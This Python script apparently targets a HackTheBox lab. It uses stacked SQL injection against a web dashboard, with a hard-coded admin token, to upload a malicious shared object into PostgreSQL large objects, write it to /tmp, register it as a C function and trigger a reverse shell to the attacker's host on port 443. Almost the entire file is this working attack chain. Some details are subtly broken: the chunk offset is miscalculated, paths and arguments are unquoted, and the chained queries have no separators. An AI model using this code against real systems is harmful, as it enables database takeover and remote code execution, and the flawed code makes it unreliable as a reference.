#!/usr/bin/python3

import requests
import random
import string
import math

# Parameters for call to rev_shell
LHOST = "10.10.15.122"
LPORT = 443

def sqli(q):
    # TODO: Use an SQL injection to run the query `q`
    url = "10.129.204.251"

    payload = {
        "title": "Hackthebox",
        "username": "quark55",
        "password": "dicker",
        "id": f"1; {q}"
    }


    cookie_values = {
        "Cookie":"Authentication=eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTcyMTU0OTgwNCwiZXhwIjoxNzIxNTU4NDQ0fQ.I5QaLRiyAT6BaVyb99vB8bfERg9ajqywSzBc8V7Dv-FM4kADDs98xfYoH0QCmYYc8mgWLy75yKfM-GwphmTe7A",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
    }
    requests.post(url=f"http://{url}:8080/dashboard/edit", headers=cookie_values, data=payload, verify=False)
    
    
with open("pg_rev_shell.so","rb") as f:
    raw = f.read()

# Create a large object
loid = random.randint(50000,60000)
sqli(f"SELECT lo_from_bytea({loid})")
print(f"[*] Created large object with ID: {loid}")

# Upload pg_rev_shell.so to large object
for pageno in range(math.ceil(len(raw)/2048)):
    page = raw[pageno*2048:pageno*2048+2048]
    offset = (pageno*2028)
    hex_page = '\\x'+page.hex()
    print(f"[*] Uploading Page: {pageno}, Length: {len(page)}")
    # sqli(f"INSERT INTO pg_largeobject (loid, pageno, data) VALUES ({loid}, {pageno}, decode('{page.hex()}','hex'));")
    
    sqli(f"SELECT lo_put({loid}, {offset}, {hex_page})")

# Write large object to file and run reverse shell
query  = f"SELECT lo_export({loid}, /tmp/pg_rev_shell.so)"
query += f"SELECT lo_unlink({loid})"
query += "DROP FUNCTION IF EXISTS rev_shell;"
query += "CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS /tmp/pg_rev_shell, rev_shell LANGUAGE C STRICT"
query += f"SELECT rev_shell({LHOST}, {LPORT})"
print(f"[*] Writing pg_rev_shell.so to disk and triggering reverse shell (LHOST: {LHOST}, LPORT: {LPORT})")
sqli(query)
